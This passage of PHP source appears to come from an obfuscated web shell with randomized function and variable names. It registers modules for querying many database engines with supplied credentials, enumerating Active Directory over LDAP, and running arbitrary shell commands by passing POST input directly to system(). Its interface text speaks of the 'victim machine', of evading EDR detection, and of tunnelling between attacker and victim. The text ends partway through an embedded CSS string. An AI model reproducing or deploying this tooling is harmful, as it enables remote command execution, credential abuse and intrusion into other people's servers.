                        echo "[Driver: sqlite3] Query failed: " .
                             htmlentities(sqlite_error_string(sqlite_last_error($Dey)));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] SQLite extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'sqlsrv') {
        $CDx = $CDx ?: 1433;

        // Check if the SQL Server PDO extension is loaded
        if (extension_loaded("pdo_sqlsrv")) {
            try {
                $wOc = "sqlsrv:Server=$LPG,$CDx" . (!empty($ybQbase) ? ";Database=$ybQbase" : "");

                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_sqlsrv] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_sqlsrv] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the SQL Server extension is loaded
        elseif (extension_loaded("sqlsrv")) {
            echo "Connecting to $LPG with default instance specification ...\n";
            $Dey = sqlsrv_connect($LPG, array("Database" => $ybQbase, "UID" => $ELMname, "PWD" => $YeY));

            if (!$Dey) {
                echo "[Driver: sqlsrv] Connection failed: " . htmlentities(sqlsrv_errors());
                echo "[Driver: sqlsrv] Trying to connect to " .
                     htmlentities($LPG) .
                     "," .
                     htmlentities($CDx) .
                     "...\n";

                $Dey = sqlsrv_connect(
                    "$LPG,$CDx",
                    array("Database" => $ybQbase, "UID" => $ELMname, "PWD" => $YeY)
                );

                if (!$Dey) {
                    echo "[Driver: sqlsrv] Connection failed: " . htmlentities(sqlsrv_errors());
                }
                else {
                    echo "[Driver: sqlsrv] Connected successfully using " .
                         htmlentities($ELMname) .
                         ":" .
                         htmlentities($YeY) .
                         " (host,port).\n";
                }
            }
            else {
                echo "[Driver: sqlsrv] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     " (host only).\n";
            }

            if (!empty($cje) && $Dey) {
                $Qdp = sqlsrv_query($Dey, $cje);
                if ($Qdp) {
                    echo "[Driver: sqlsrv] Query executed successfully.\n";
                    $OgF = array();
                    while ($DdP = sqlsrv_fetch_array($Qdp, SQLSRV_FETCH_ASSOC)) {
                        $OgF[] = $DdP;
                    }
                    yITb($OgF);
                }
                else {
                    echo "[Driver: sqlsrv] Query failed: " . htmlentities(sqlsrv_errors());
                }
            }
        }
        else {
            echo "[Driver: none] SQL Server extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'oci') {
        $CDx = $CDx ?: 1521;

        // Check if the Oracle PDO extension is loaded
        if (extension_loaded("pdo_oci")) {
            try {
                if (!empty($Qwe)) {
                    $lqm = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $LPG)(PORT = $CDx))(CONNECT_DATA = (SID = $Qwe)))";
                }
                else {
                    $lqm = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $LPG)(PORT = $CDx))(CONNECT_DATA = (SERVICE_NAME = $Uvc)))";
                }
                $wOc = "oci:dbname=$lqm";

                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_oci] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_oci] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the Oracle extension is loaded
        elseif (extension_loaded("oci8")) {
            $Dey = oci_connect($ELMname, $YeY, "$LPG:$CDx/$Uvc");

            if (!$Dey) {
                echo "[Driver: oci8] Connection failed: " . htmlentities(oci_error());
            }
            else {
                echo "[Driver: oci8] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $leBement = oci_parse($Dey, $cje);
                    if ($leBement) {
                        if (oci_execute($leBement)) {
                            echo "[Driver: oci8] Query executed successfully.\n";
                            $OgF = array();
                            while ($DdP = oci_fetch_assoc($leBement)) {
                                $OgF[] = $DdP;
                            }
                            yITb($OgF);
                        }
                        else {
                            echo "[Driver: oci8] Query failed: " . htmlentities(oci_error($leBement));
                        }
                    }
                    else {
                        echo "[Driver: oci8] Query failed: " . htmlentities(oci_error($Dey));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] Oracle extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'mongodb') {
        $CDx = $CDx ?: 27017;
        $wOc = "mongodb://$ELMname:$YeY@$LPG:$CDx/$ybQbase";

        // Check if the MongoDB extension is loaded
        if (extension_loaded("mongodb")) {
            try {
                $Dey = new MongoDB\Driver\Manager($wOc, explode("&", $yhe));
                echo "[Driver: mongodb] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $cje = new MongoDB\Driver\Query(array());
                    $LuP = $Dey->executeQuery("$ybQbase.$Faq", $cje);

                    $OgF = array();
                    foreach ($LuP as $DdP) {
                        $OgF[] = $DdP;
                    }
                    yITb($OgF);
                }
            }
            catch (MongoDB\Driver\Exception\Exception $xql) {
                echo "[Driver: mongodb] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the Mongo extension is loaded
        elseif (extension_loaded("mongo")) {
            try {
                $Dey = new Mongo($wOc, array_merge(array("connect" => true), explode("&", $yhe)));
                echo "[Driver: mongo] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Faq = $Dey->selectCollection($ybQbase, $Faq);
                    $LuP = $Faq->find();

                    $OgF = array();
                    foreach ($LuP as $DdP) {
                        $OgF[] = $DdP;
                    }
                    yITb($OgF);
                }
            }
            catch (MongoConnectionException $xql) {
                echo "[Driver: mongo] Connection failed: " . htmlentities($xql->getMessage());
            }
            catch (Exception $xql) {
                echo "[Driver: mongo] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        else {
            echo "[Driver: none] MongoDB extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'ibm') {
        $CDx = $CDx ?: 50000;
        $wOc = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$ybQbase;HOSTNAME=$LPG;PORT=$CDx;PROTOCOL=TCPIP;UID=$ELMname;PWD=$YeY;";

        // Check if the IBM PDO extension is loaded
        if (extension_loaded("pdo_ibm")) {
            try {
                $vvo = new PDO($wOc);
                echo "[Driver: pdo_ibm] Connected successfully using $" .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_ibm] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the IBM extension is loaded
        elseif (extension_loaded("ibm")) {
            $Dey = db2_connect($wOc, $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: ibm] Connection failed: " . htmlentities(db2_conn_error());
            }
            else {
                echo "[Driver: ibm] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Qdp = db2_exec($Dey, $cje);
                    if ($Qdp) {
                        echo "[Driver: ibm] Query executed successfully.\n";
                        $OgF = array();
                        while ($DdP = db2_fetch_assoc($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
                        echo "[Driver: ibm] Query failed: " . htmlentities(db2_conn_error());
                    }
                }
            }
        }
        else {
            echo "[Driver: none] IBM extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'firebird') {
        $CDx = $CDx ?: 3050;
        $wOc = "firebird:dbname=$LPG/$CDx:$ybQbase" .
               (!empty($vAY) ? ";charset=$vAY" : "") .
               (!empty($Ulh) ? ";role=$Ulh" : "") .
               (!empty($Emx) ? ";dialect=$Emx" : "");

        // Check if the Firebird PDO extension is loaded
        if (extension_loaded("pdo_firebird")) {
            try {
                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_firebird] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_firebird] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the Firebird extension is loaded
        elseif (extension_loaded("interbase")) {
            echo "Connecting to $LPG/$CDx:$ybQbase (TCP/IP on custom port) ...\n";
            $Dey = ibase_connect($LPG . "/" . $CDx . ":" . $ybQbase, $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: interbase] Connection failed: " . htmlentities(ibase_errmsg());
                echo "[Driver: interbase] Trying to connect to " .
                     htmlentities($LPG) .
                     ":" .
                     htmlentities($ybQbase) .
                     " (TCP/IP implicit port) ...\n";

                $Dey = ibase_connect($LPG . ":" . $ybQbase, $ELMname, $YeY);

                if (!$Dey) {
                    echo "[Driver: interbase] Connection failed: " . htmlentities(ibase_errmsg());
                    echo "[Driver: interbase] Trying to connect to //" .
                         htmlentities($LPG) .
                         "/" .
                         htmlentities($ybQbase) .
                         " (NetBEUI) ...\n";

                    $Dey = ibase_connect("//" . $LPG . "/" . $ybQbase, $ELMname, $YeY);

                    if (!$Dey) {
                        echo "[Driver: interbase] Connection failed: " . htmlentities(ibase_errmsg());
                    }
                    else {
                        echo "[Driver: interbase] Connected successfully using " .
                             htmlentities($ELMname) .
                             ":" .
                             htmlentities($YeY) .
                             " (//host/database aka NetBEUI).\n";
                    }
                }
                else {
                    echo "[Driver: interbase] Connected successfully using " .
                         htmlentities($ELMname) .
                         ":" .
                         htmlentities($YeY) .
                         " (host:database).\n";
                }
            }
            else {
                echo "[Driver: interbase] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     " (host/port:database).\n";
            }

            if (!empty($cje) && $Dey) {
                $Qdp = ibase_query($Dey, $cje);
                if ($Qdp) {
                    echo "[Driver: interbase] Query executed successfully.\n";
                    $OgF = array();
                    while ($DdP = ibase_fetch_assoc($Qdp)) {
                        $OgF[] = $DdP;
                    }
                    yITb($OgF);
                }
                else {
                    echo "[Driver: interbase] Query failed: " . htmlentities(ibase_errmsg());
                }
            }
        }
        else {
            echo "[Driver: none] Firebird extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'odbc') {
        $wOc = "odbc:Driver=$EQn;Server=$LPG,$CDx;Database=$ybQbase;Uid=$ELMname;Pwd=$YeY;";

        // Check if the ODBC PDO extension is loaded
        if (extension_loaded("pdo_odbc")) {
            try {
                $vvo = new PDO($wOc);
                echo "[Driver: pdo_odbc] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_odbc] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the ODBC extension is loaded
        elseif (extension_loaded("odbc")) {
            $Dey = odbc_connect($wOc, $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: odbc] Connection failed: " . htmlentities(odbc_errormsg());
            }
            else {
                echo "[Driver: odbc] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Qdp = odbc_exec($Dey, $cje);
                    if ($Qdp) {
                        echo "[Driver: odbc] Query executed successfully.\n";
                        $OgF = array();
                        while ($DdP = odbc_fetch_array($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
                        echo "[Driver: odbc] Query failed: " . htmlentities(odbc_errormsg());
                    }
                }
            }
        }
        else {
            echo "[Driver: none] ODBC extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'informix') {
        $CDx = $CDx ?: 9800;
        $wOc = "informix:host=$LPG;service=$CDx;database=$ybQbase;server=$MSw;protocol=$nzm;EnableScrollableCursors=$RyE";

        // Check if the Informix PDO extension is loaded
        if (extension_loaded("pdo_informix")) {
            try {
                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_informix] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_informix] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        else {
            echo "[Driver: none] Informix extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'sybase') {
        $CDx = $CDx ?: 5000;
        $wOc = "sybase:host=$LPG:$CDx" . (!empty($ybQbase) ? ";dbname=$ybQbase" : "");

        // Check if the Sybase PDO extension is loaded
        if (extension_loaded("pdo_dblib")) {
            try {
                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_dblib] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_dblib] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the Sybase extension is loaded
        elseif (extension_loaded("sybase")) {
            $Dey = sybase_connect($LPG, $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: sybase] Connection failed: " . htmlentities(sybase_get_last_message());
            }
            else {
                echo "[Driver: sybase] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Qdp = sybase_query($cje, $Dey);
                    if ($Qdp) {
                        echo "[Driver: sybase] Query executed successfully.\n";
                        $OgF = array();
                        while ($DdP = sybase_fetch_assoc($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
                        echo "[Driver: sybase] Query failed: " . htmlentities(sybase_get_last_message());
                    }
                }
            }
        }
        // Check if the FreeTDS extension is loaded
        elseif (extension_loaded("mssql")) {
            $Dey = mssql_connect($LPG, $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: mssql] Connection failed: " . htmlentities(mssql_get_last_message());
            }
            else {
                echo "[Driver: mssql] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Qdp = mssql_query($cje, $Dey);
                    if ($Qdp) {
                        echo "Query executed successfully.\n";
                        while ($DdP = mssql_fetch_assoc($Qdp)) {
                            echo json_encode($DdP);
                        }
                    }
                    else {
                        echo "Query failed: " . htmlentities(mssql_get_last_message());
                    }
                }
            }
        }
        else {
            echo "[Driver: none] Sybase extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'raw') {
        $wOc = $ERU;

        // Check if the PDO extension is loaded
        if (extension_loaded("pdo")) {
            try {
                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: PDO] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: PDO] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        else {
            echo "[Driver: PDO] PDO extension is not loaded.\n";
        }
    }
    else {
        echo "[Driver: none] Unsupported database type: " . htmlentities($jPm_type) . PHP_EOL;
    }
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function ysXc(&$HpEs) {
    global $axU;

    $HpEs[] = array(
        "title"       => "Query databases",
        "description" => "Query databases using the provided credentials.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
</svg>',
        "op"          => $axU,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yjZi(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "text",
                        "Domain controller",
                        "s82",
                        "hostname or IP address",
                        "The domain controller to connect to.",
                        true
                    ),
                    yvFX(
                        "text",
                        "LDAP port",
                        "h39",
                        "389",
                        "The port to connect to."
                    ),
                    yvFX(
                        "text",
                        "Domain",
                        "A64",
                        "example.com",
                        "The domain to connect to.",
                        true
                    ),
                    yvFX(
                        "text",
                        "Username",
                        "u43",
                        "admin",
                        "The username to connect with."
                    ),
                    yvFX(
                        "password",
                        "Password",
                        "L10",
                        "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                        "The password to connect with."
                    ),
                    yvFX(
                        "textarea",
                        "Query",
                        "j48",
                        "(&(objectClass=user)(sAMAccountName=*))",
                        "The LDAP query to run against the domain controller.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function yVIX($VPY, $HpEs) {
    yPXQ(
        $_POST["s82"],
        !empty($_POST["h39"]) ? intval($_POST["h39"]) : null,
        !empty($_POST["u43"]) ? $_POST["u43"] : null,
        !empty($_POST["L10"]) ? $_POST["L10"] : null,
        $_POST["A64"],
        $_POST["j48"]
    );
}

/**
 * @param $MSw string LDAP server
 * @param $CDx int|null LDAP port
 * @param $ELMname string|null LDAP username
 * @param $YeY string|null LDAP password
 * @param $Dkw string LDAP domain
 * @param $cje string LDAP query
 *
 * @return void
 */
function yPXQ($MSw, $CDx, $ELMname, $YeY, $Dkw, $cje) {
    $CDx = $CDx ?: 389;

    // Connect to LDAP server
    $FWZ = ldap_connect("ldap://$MSw", $CDx);

    if (!$FWZ) {
        echo "Connection failed: " . htmlentities(ldap_error($FWZ));
        return;
    }

    $QCF = "DC=" . implode(",DC=", explode(".", $Dkw));
    echo "Connected successfully to LDAP server " . htmlentities($MSw) . ":" . htmlentities($CDx) . PHP_EOL;
    echo "Base DN: " . htmlentities($QCF) . PHP_EOL;

    // Set LDAP options
    ldap_set_option($FWZ, LDAP_OPT_PROTOCOL_VERSION, 3);
    ldap_set_option($FWZ, LDAP_OPT_REFERRALS, 1);
    ldap_set_option($FWZ, LDAP_DEREF_ALWAYS, 1);

    // Bind to LDAP server
    if (!empty($ELMname) && !empty($YeY)) {
        $ELMname = "CN=$ELMname,$QCF";
        echo "Binding with username: " . htmlentities($ELMname) . PHP_EOL;

        // Bind with username and password (authenticating)
        $EXp = ldap_bind($FWZ, $ELMname, $YeY);
    }
    else {
        echo "Binding anonymously\n";
        $EXp = ldap_bind($FWZ);
    }

    if (!$EXp) {
        echo "Bind failed: " . htmlentities(ldap_error($FWZ));
        return;
    }

    // Perform LDAP search
    $YHL = ldap_search($FWZ, $QCF, trim($cje), array("*"), 0, 0);

    if (!$YHL) {
        echo "Search failed: " . htmlentities(ldap_error($FWZ));
        return;
    }

    // Get search result entries
    $svp = ldap_get_entries($FWZ, $YHL);

    if (!$svp) {
        echo "Search failed: " . htmlentities(ldap_error($FWZ));
        return;
    }

    echo "Query executed successfully (Query: " . htmlentities($cje) . ")\n";
    echo json_encode($svp);

    // Close LDAP connection
    ldap_unbind($FWZ);
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function ypWT(&$HpEs) {
    global $kap;

    $HpEs[] = array(
        "title"       => "Query LDAP",
        "description" => "Query LDAP using the provided credentials.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
</svg>',
        "op"          => $kap,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yqcm(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yKfD(
                "Running system commands",
                "Running system commands results in the creation of a child process from the 
                webserver/php process (aka a new terminal is spawned), this behaviour as you may expect can be 
                easily detected by EDR and other security solutions.
                <br/>
                If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
                victim machine and ensure that there is no security solution running before using this module."
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "textarea",
                        "Command",
                        "s82",
                        "ls -lah | grep pass",
                        "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function ySUw($VPY, $HpEs) {
    system($_POST["s82"]);
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yxku(&$HpEs) {
    global $dud;

    $HpEs[] = array(
        "title"       => "Run command",
        "description" => "Run a system command using the default shell.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
        "op"          => $dud,
    );
}


ybmP("isolated_ops", "ylyW");
ybmP("features", "yGdW");
yjMr("GET_page", $xqlAS, "ynsT");
yjMr("POST_operation", $xqlAS, "yzup");


ybmP("features", "yKLr");
yjMr("GET_page", $CDM, "yknc");


ybmP("isolated_ops", "ywSZ");
ybmP("features", "yZph");
yjMr("GET_page", $yub, "yCTN");
yjMr("POST_operation", $yub, "yMlu");


ybmP("isolated_ops", "yadK");
ybmP("features", "yNwP");
yjMr("GET_page", $tRi, "yBoc");
yjMr("POST_operation", $tRi, "ywcQ");


ybmP("features", "ylnX");
yjMr("GET_page", $VGK, "yIHc");
yjMr("POST_operation", $VGK, "yxrz");


ybmP("features", "yLPT");
yjMr("GET_page", $aXz, "ykEC");
yjMr("POST_operation", $aXz, "yOow");


ybmP("isolated_ops", "ycIb");
ybmP("features", "yNQO");
yjMr("GET_page", $NTp, "yPIh");
yjMr("POST_operation", $NTp, "yoLd");


ybmP("isolated_ops", "yetO");
ybmP("features", "yzmu");
yjMr("GET_page", $Znu, "yoCX");
yjMr("GET_page", $Znu_PREVIEW, "yoCX");
yjMr("POST_operation", $Znu, "ygwI");
yjMr("POST_operation", $Znu_PREVIEW, "ygwI");


ybmP("features", "yzJT");
yjMr("GET_page", $VYD, "yyPd");
yjMr("POST_operation", $VYD, "yssr");


session_start();
ybmP("page_generation", "ypVA");
ybmP("isolated_ops", "ykyw");
ybmP("features", "yQmy");
yjMr("GET_page", $nqi, "yWpf");
yjMr("POST_operation", $nqi, "yLfq");


ybmP("features", "ypak");
yjMr("GET_page", $SMv, "yQlM");


ybmP("features", "yiOD");
yjMr("GET_page", $FJG, "yHbg");
yjMr("POST_operation", $FJG, "ytCo");


ybmP("features", "ysXc");
yjMr("GET_page", $axU, "yKUz");
yjMr("POST_operation", $axU, "yNhD");


ybmP("features", "ypWT");
yjMr("GET_page", $kap, "yjZi");
yjMr("POST_operation", $kap, "yVIX");


ybmP("features", "yxku");
yjMr("GET_page", $dud, "yqcm");
yjMr("POST_operation", $dud, "ySUw");


// section.main
date_default_timezone_set("UTC");
$GnR = '/*! tailwindcss v3.4.3 | MIT License | https://tailwindcss.com*/*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:initial}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:initial;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:initial}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}[multiple],[type=date],[type=datetime-local],[type=email],[type=month],[type=number],[type=password],[type=search],[type=tel],[type=text],[type=time],[type=url],[type=week],input:where(:not([type])),select,textarea{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#6b7280;border-width:1px;border-radius:0;padding:.5rem .75rem;font-size:1rem;line-height:1.5rem;--tw-shadow:0 0 #0000}[multiple]:focus,[type=date]:focus,[type=datetime-local]:focus,[type=email]:focus,[type=month]:focus,[type=number]:focus,[type=password]:focus,[type=search]:focus,[type=tel]:focus,[type=text]:focus,[type=time]:focus,[type=url]:focus,[type=week]:focus,input:where(:not([type])):focus,select:focus,textarea:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow);border-color:#2563eb}input::-moz-placeholder,textarea::-moz-placeholder{color:#6b7280;opacity:1}input::placeholder,textarea::placeholder{color:#6b7280;opacity:1}::-webkit-datetime-edit-fields-wrapper{padding:0}::-webkit-date-and-time-value{min-height:1.5em;text-align:inherit}::-webkit-datetime-edit{display:inline-flex}::-webkit-datetime-edit,::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-meridiem-field,::-webkit-datetime-edit-millisecond-field,::-webkit-datetime-edit-minute-field,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-second-field,::-webkit-datetime-edit-year-field{padding-top:0;padding-bottom:0}select{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg 